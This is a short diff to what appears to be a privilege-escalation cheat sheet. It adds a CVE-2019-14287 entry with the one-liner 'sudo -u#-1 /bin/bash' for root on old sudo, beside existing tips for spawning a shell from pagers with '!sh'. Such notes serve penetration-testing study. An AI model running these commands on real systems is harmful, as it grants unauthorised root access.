@@ -265,3 +265,9 @@ When a file is opene a tool that creates multiple pages beyond the bounds of you
 &nbsp;&nbsp;&nbsp;&nbsp;<code> 1. Using less or more or man, etc, which accept commands by giving a ! And command like !sh </code>
 
 &nbsp;&nbsp;&nbsp;&nbsp;<code> 2. Open large file, type anything and then give it !/bin/sh or !sh etc! </code>
+
+### sudo cve CVE-2019-14287
+
+If sudo is < 1.8.28 there's an easy bypass to root
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>sudo -u#-1 /bin/bash</code>
